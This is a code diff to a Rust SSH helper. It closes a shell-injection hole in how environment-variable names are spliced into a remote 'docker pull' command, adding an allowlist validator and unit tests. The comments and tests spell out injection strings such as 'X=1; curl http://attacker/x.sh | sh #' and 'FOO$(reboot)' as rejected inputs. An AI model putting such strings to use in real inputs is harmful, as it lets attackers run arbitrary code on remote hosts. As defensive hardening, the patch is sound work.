@@ -566,11 +566,20 @@ pub async fn pull_image(
         ));
     }
     let quoted = shell_quote(image_ref.trim());
-    let prefix = env_prefix
-        .iter()
-        .map(|(k, v)| format!("{}={}", k, shell_quote(v)))
-        .collect::<Vec<_>>()
-        .join(" ");
+    // The value is shell-quoted, but the KEY is spliced in raw before the
+    // `KEY=` — validate it as a real environment-variable name so a crafted
+    // key (e.g. `X=1; curl evil|sh #`) can't break out and run commands on
+    // the remote host (the prefix runs through `/bin/sh -c`, often as root).
+    let mut prefix_parts = Vec::with_capacity(env_prefix.len());
+    for (k, v) in env_prefix {
+        if !is_valid_env_key(k) {
+            return Err(SshError::InvalidConfig(format!(
+                "docker pull: invalid environment variable name {k:?}"
+            )));
+        }
+        prefix_parts.push(format!("{}={}", k, shell_quote(v)));
+    }
+    let prefix = prefix_parts.join(" ");
     let cmd = if prefix.is_empty() {
         format!("docker pull {}", quoted)
     } else {
@@ -987,6 +996,19 @@ pub fn is_safe_id(id: &str) -> bool {
     chars.all(|c| c.is_ascii_alphanumeric() || matches!(c, '_' | '.' | '-'))
 }
 
+/// Strict allowlist for an environment-variable name spliced into a
+/// `KEY=value` shell prefix: a leading letter or `_`, then letters,
+/// digits, or `_`. Rejects anything with shell metacharacters so the key
+/// can never break out of the assignment position.
+pub fn is_valid_env_key(key: &str) -> bool {
+    let mut chars = key.chars();
+    match chars.next() {
+        Some(c) if c.is_ascii_alphabetic() || c == '_' => {}
+        _ => return false,
+    }
+    chars.all(|c| c.is_ascii_alphanumeric() || c == '_')
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -1135,6 +1157,19 @@ not-json-at-all
         assert!(!is_safe_id(&long));
         let max = "a".repeat(255);
         assert!(is_safe_id(&max));
+    }
+
+    #[test]
+    fn env_key_validation_blocks_injection() {
+        assert!(is_valid_env_key("HTTPS_PROXY"));
+        assert!(is_valid_env_key("_X"));
+        assert!(is_valid_env_key("NO_PROXY2"));
+        assert!(!is_valid_env_key(""));
+        assert!(!is_valid_env_key("1ABC")); // leading digit
+        assert!(!is_valid_env_key("X=1; curl http://attacker/x.sh | sh #"));
+        assert!(!is_valid_env_key("FOO BAR"));
+        assert!(!is_valid_env_key("FOO$(reboot)"));
+        assert!(!is_valid_env_key("A-B"));
     }
 
     #[test]
